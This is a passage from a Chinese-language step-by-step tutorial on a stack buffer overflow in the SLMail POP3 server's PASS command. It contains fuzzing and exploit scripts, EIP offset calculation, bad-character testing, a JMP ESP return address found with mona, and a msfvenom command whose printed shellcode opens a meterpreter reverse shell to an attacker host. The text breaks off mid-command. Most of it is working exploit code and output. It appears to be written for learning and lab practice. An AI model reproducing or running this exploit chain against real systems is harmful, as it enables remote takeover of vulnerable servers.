POP3!\")\n\n\n\nFUZZING\n\n\n\n\n\n\n\n\n\n测试PASS命令接收到大量数据时是否会溢出\nEIP寄存器存放下一条指令的地址\n\n\n使用FUZZ脚本探测PASS指令是否存在缓冲区溢出\n\n#!/usr/bin/python\nimport socket\n\nbuffer = [\"A\"]  #\ncounter = 100   # 计数\nwhile len(buffer)&lt;=50:\n    buffer.append(\"A\"*counter)  # 每次增加100个A\n    counter = counter+200\n\nfor string in buffer:\n    print(\"Fuzzing PASS with %s bytes\" % len(string))\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connect = s.connect(('192.168.216.172',110))\n    s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    s.recv(1024)\n    s.send('PASS '+string+'\\r\\n')  \n    s.send('QUIT\\r\\n')\n    s.close()\n\n\n执行脚本之前打开ImmunityDebugger调试工具，File-&gt;Attach监听110端口所在PID为560的进程\n\n\n\n\n\n\n\n\n\n\n\n\n左上的框是运行的汇编指令的窗口；右上的框寄存器窗口；左下的框是内存数据的窗口；右下的框其他相关的数据。\n重点关注寄存器的窗口，寄存器数据交给CPU去执行。\n\n此时右下角为Paused暂停状态，需要使进程运行起来\n\n\n\n\n执行脚本，发送数据\n\n\n\n\n\n\n\n\n\n\n\n数据发送到2900的时候已经暂停了\n\nXP服务端进程已经暂停，重点关注EIP寄存器\n\n\n\n\n\n\n\n\n\n\n\n\n\n由于寄存器的数据马上会交给CPU 去执行。首先我们需要关注的是寄存器里的EIP（EIP：寄存器存放下一条指令的地址），此时EIP内容为41414141，是16进制数，16进制的‘41’对应ASCII码中的‘A’，因此EIP寄存器被填满了A，而ESP、EBP都被填满了A，右下窗口里的数据也都是A。EIP寄存器存放下一条指令的地址，而此时EIP已经被缓冲区溢出的数据覆盖了原本真正的地址，下一跳指令就会跑到AAAA的地址上执行代码，而AAAA地址上不存在正确的程序代码，因此导致程序崩溃停止。\n右下框存放内存地址中：从第一个地址01F79F20直到最后一个地址01F7A1AC都被‘A’填满；\n此时程序已经崩溃，需要重新启动。\n\n漏洞利用\n\n\n\n\n\n\n\n\n思路：\nEIP存放的是下一条指令的寄存器，若是可以修改下一条指令的位置，就可以修改程序运行的流程；假如下一条指令需要查询用户是否存在，就可以修改为执行一条系统命令，或者修改EIP中的地址将指令指向一个内存地址空间，这个内存地址空间中填满shellcode（后门程序），就可以完全控制目标服务器。\n1、重新启动POP3，启动调试器并监听110端口2、重新编写脚本#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = 'A'*2700  \ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n    \n'''\n测试时数据在2700左右实现了EIP寄存器溢出；若是2700没有溢出，就变成2900/3100，需要精确的定位到这覆盖EIP寄存器的这4个字节到底是第多少个，只有精确了第多少个字符，再去修改脚本，添加下一条指令，达到修改程序运行流程的目的。\n'''\n\n3、测试溢出数据发送2700个A时程序已经崩溃\n\n\n修改数据为2600测试，若2600个A没有溢出，说明修改了EIP寄存器中的4个字节的A就在2600-2700之间，具体是多少，需要进一步测试\n\n\n\n\n\n\n\n\n\n\n\n\n此时程序已经挂掉，但服务还在运行，此时的EIP地址没有被‘A’填满，地址不是41414141；是未知的地址65746174；\n说明了溢出的部分就在2600-2700之间，接下来就要确定是具体什么位置导致EIP寄存器被修改，才能重定向程序运行流程。\n4、寻找具体位置\n\n\n\n\n\n\n\n\n\n二分法：通过不断取中间值找到最终结果。\n唯一字符串法：通过发送2700个唯一字符，其中每四个字符为一组，每一组字符的内容都不相同，都是唯一的，此时我们就只需要看被填充到EIP里的是哪四个字符串就可以立马定位到是第几个位置的字符串被填充到EIP中，然后就可以对EIP中的数值进行精确的修改。\n\n5、唯一字符串法\n\n\n\n\n\n\n\n\n使用msf现成的脚本发送2700个唯一的字符\ncd &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit\n.&#x2F;pattern_create.rb -l 2700\n\n\n\n\n\n\n\n\n\n\n首先进入到msf相应目录，运行pattern_create.rb脚本生成2700个唯一字符串，生成的每3个字符为一组的2700组的唯一字符串。\n\n6、将生成的字符串填入到脚本中#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n\n7、发送新数据\n\n\n\n\n\n\n\n\n\n\n得到地址39 69 44 38，此时就是EIP寄存器溢出的4个字节；\n内存地址与平常书写的地址是相反的：内存低地址放在高位；内存高地址放在低位\n调整顺序：38 44 69 39\n8、查ASCII码表进行转换\n\n\n\n\n\n\n\n\n38—&gt;8\n44—&gt;D\n69—&gt;i\n39—&gt;9\n\n\n\n\n9、计算偏移量利用msf下的pattern_offset.rb可以计算39694438所在2700个字符串中的偏移量\n\n\n\n\n\n\n\n\n\n\n精确的匹配到2606偏移处，第2606开始就是8Di9(39694438)，8是2607偏移处\n10、验证位置是否准确#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = 'A'*2606+'B'*4+'C'*20\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n    \n'''\n若能在EIP中精确的写入4个B，证明此位置就是溢出的位置\n'''\n\n\n\n\n\n\n\n\n\n\n\n执行完脚本之后，EIP寄存器地址被修改为42424242，查看ASCII码表之后对应42—&gt;B，修改成功，此时可以任意修改EIP地址；ESP寄存器被填入20个C。\n假设在ESP寄存器中填入的不是20个C，而是一串shellcode(恶意代码)，shellcode在目标服务器上开一个端口，或者主动使用nc反向连接攻击者系统的一个指定端口，此时就可以达到远程目标系统的目的。\n11、写入shellcode思路\n\n\n\n\n\n\n\n\n\n思路：\n将EIP修改为shellcode代码的内存地址，将shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行；在写入shellcode之前，需要寻找可存放shellcode的内存空间。\n\n\n\n12、寻找可存放shellcode的内存空间\n\n\n\n\n\n\n\n\n在ESP寄存器中尝试存放shellcode；\n假设ESP寄存器可以存放3500个字符，减去前面的2610个字符后，将剩下的字符存放到ESP寄存器中，查看到底有多少个C字符可以到达ESP寄存器中，最终判断ESP寄存器的大小，从而判断是否可以放入一个shellcode代码。\n#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = 'A'*2606+'B'*4+'C'*(3500-2606-4)\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n\n\n\n\n\n\n\n\n\n\n执行脚本后ESP寄存器中存放了很多C\n\n\n\n\n\n\n\n\n\n\n\n\n点击右键Follow in Dump，接着在左下框点击Hex dump查看ESP内存空间中出现C字符，利用初始地址和结束地址计算地址空间；\n起始地址：01F79210\n结束地址：01F793C0\n使用科学性计算器计算地址空间为1A0\n\n转换为十进制为416\n\n\n\n\n\n\n\n\n\n\n通常使用的较小巧的shellcode，需要300字节左右，足以存放一个shellcode；此时就可以将shellcode写入ESP寄存器，通过修改EIP寄存器内存地址的方式让程序跳转到ESP寄存器，让CPU提取ESP寄存器中的shellcode，执行shellcode连接攻击者主机达到控制目标服务器的目的。\n13、测试坏字符\n\n\n\n\n\n\n\n\n此时不能够直接写入shellcode，由于程序，协议和漏洞的不同，有些字符在缓冲区中是不能够使用的，这些字符因程序和协议的不同也会有所不同，有些协议会过滤0a，有些会协议过滤0b或者有些协议遇到0c程序就会崩溃，这些字符就被称为坏字符，这些坏字符是不能够出现在缓冲区中的；因此，在注入shellcode之前需要测试出所有的坏字符，否则shellcode就无法正常运行。\n在POP3协议中，null byte (0x00)为 空字符，用于终止字符串的拷贝操作；return (0x0D) 回车操作，表示POP3 PASS 命令输入完成，这两字符在shellcode中不能使用，但还要测试其他的坏字符。\n思路：\n使用脚本发送0x00 — 0xff 256个字符，查找所有坏字符。\n#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbadchars = (\n        \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n        \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n        \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n        \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x29\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n        \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n        \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n        \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n        \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n        \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n        \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n        \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n        \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n        \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n        \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n        \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n        \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\")\nbuffer = 'A'*2606+'B'*4+badchars\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    s.close()\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3!\")\n\n\n\n\n\n\n\n\n\n\n\n同样右键Follow in Dump，此时ESP的内存地址为01F7A154，左下框中寻找从01F7A154起始的位置进行查看。观察发现从09开始，0a出现时后面的字符都没有了，0a字符可能是坏字符，剔除掉0a之后继续测试。\n将0a换成09再次执行脚本\n#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbadchars = (\n        \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x09\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n        \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n        \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n        \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x29\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n        \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n        \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n        \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n        \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n        \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n        \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n        \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n        \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n        \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n        \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n        \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n        \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\")\nbuffer = 'A'*2606+'B'*4+badchars\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    s.close()\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3!\")\n\n\n\n\n\n\n\n\n\n\n\n此时替换掉0a字符之后，后面的字符都正常出现了（0d被自动过滤掉）；查看最后一列，从11开始一直到F1都正常出现；查看最后一行，从F2开始一直到FF也都正常出现。由此发现，只有00，0a，0d是坏字符，这三个坏字符不能作为shellcode代码写入缓冲区空间中。\n14、重定向思路\n\n\n\n\n\n\n\n\n\nESP的地址是变化的，硬编码不可行，SLMail 是基于线程的应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定。\n\n变通思路，使用间接的方法，在内存中寻找地址固定的系统模块，系统模块中有大量的指令，在模块中寻找 JMP ESP(汇编)指令(意思是跳到ESP地址)的地址，再由该指令间接跳转到 ESP，从而执行shellcode；简单来说就是：在EIP中存放那个内存地址固定不变的系统模块中的JMP ESP指令的内存地址，再由JMP ESP指令跳到ESP，执行ESP中的shellcode。\n\n\n15、寻找地址固定不变的系统模块在最下方的方框中执行mona脚本，输入!mona modules查找系统中正在运行的所有模块\n\n\n\n\n\n\n\n\n\n\n重点关注Rebase一列，表示操作系统重启，重启之后内存地址是否发生变化，若发生变化就是True，不发生变化就是False。SafeSEH，ASLR和NXCompat这三列都是操作系统默认内存保护机制，所以需要选择不受内存保护机制保护的系统模块；若是受保护模块，每次重启都是随机地址，无法利用shellcode；最后一列，OS Dll(OS动态链接库)必须选择True，选择操作系统自带的库。前四列都是False，最后一列是True。\n图中第一个符合要求的模块，然后查找这个模块中是否存在JMP ESP的指令，如果没有就利用不了这个模块\n\n由于JMP ESP汇编指令所对应的二进制，使用kali metasploit下的nasm_shell.rb将汇编指令转换为二进制\ncd &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit\n.&#x2F;nasm_shell.rb\n\n\n使用!mona find -s &quot;\\xff\\xe4&quot; -m openc32.dll查找\n\n\n\n\n\n\n\n\n\n\n这个模块没有找到执行JMP ESP指令的代码。\n\n\n\n\n\n\n\n\n\n\n\n还剩下最后两个符合模块可以使用\n\n\n\n\n\n\n\n\n\n\n\n从SLMFC.dll模块中找到了19个可利用的地址（第一列表示地址）\n双击第一个地址，并且右键使其进行汇编的显示进行查看\n\n\n\n\n\n\n\n\n\n\n第一个就是JMP ESP的地址\n点击工具栏中的m打开内存地图，其中SLMFC.dll的基地址为5f400000，查看内存地图寻找此基地址\n\n\n\n\n\n\n\n\n\n\n这是个PE的执行程序头，text段是个code代码。因为SLMail是不支持DEP（DEP：阻止代码从数据页被执行）和ASLR（ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化）的内存保护机制的，因此我们可以19个地址中随便选一个进行跳转。如果这个程序支持DEP，那么Map中Access列的权限必须为R(可读)E(可执行)，否则受DEP保护将不能正确执行跳转。\n\n\n\n\n\n\n\n\n\n\n\n右键Breakpoint-&gt;Memory，on access进行断点调试，之后点击工具栏运行；（只要访问到这个地址程序就会中断）\n设置断点为了让python的脚本向程序发送溢出的代码，看溢出的代码在跑到这个断点时是否被正确的跳转，验证它能否真正实现跳转\n#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = 'A'*2606+\"\\xe3\\x41\\x4b\\x5f\"+'C'*390  # 将地址存入EIP寄存器（地址需要反转）\ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n\n\n\n\n\n\n\n\n\n\n\n\n程序已经运行到断点，终止运行；此时EIP已经写入5F4B41E3\n跳转到上一步Step into\n\n\n\n\n\n\n\n\n\n\n\n上一步的地址为0161A154，此时正是ESP寄存器的地址，存放的都是ASCII中的C字符；\n此时我们已经实现了对EIP的修改，也实现了它跳转到ESP，下一步就需要将ESP中的C替换为真正的shellcode。\n16、生成shellcodemsfvenom -l payload命令查看payload\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.216.166 LPORT=4444 -a x86 --platform Windows -f c\n\n&quot;\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x89\\xe5\\x64\\x8b\\x52&quot;\n&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot;\n&quot;\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d&quot;\n&quot;\\x01\\xc7\\x49\\x75\\xef\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01&quot;\n&quot;\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x58\\x20\\x01&quot;\n&quot;\\xd3\\x8b\\x48\\x18\\x50\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34&quot;\n&quot;\\x8b\\x01\\xd6\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75&quot;\n&quot;\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01&quot;\n&quot;\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01&quot;\n&quot;\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58&quot;\n&quot;\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00&quot;\n&quot;\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\x89\\xe8&quot;\n&quot;\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80&quot;\n&quot;\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\xd8\\xa6\\x68\\x02\\x00&quot;\n&quot;\\x11\\x5c\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea&quot;\n&quot;\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74&quot;\n&quot;\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67&quot;\n&quot;\\x00\\x00\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f&quot;\n&quot;\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10&quot;\n&quot;\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53&quot;\n&quot;\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8&quot;\n&quot;\\x00\\x7d\\x28\\x58\\x68\\x00\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b&quot;\n&quot;\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e&quot;\n&quot;\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff&quot;\n&quot;\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\\xf0\\xb5\\xa2\\x56\\x6a&quot;\n&quot;\\x00\\x53\\xff\\xd5&quot;;\n\n\n\n\n\n\n\n\n\n\n\n此时的shellcode包含坏字符，不能够使用\n执行以下命令去掉坏字符：\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.166 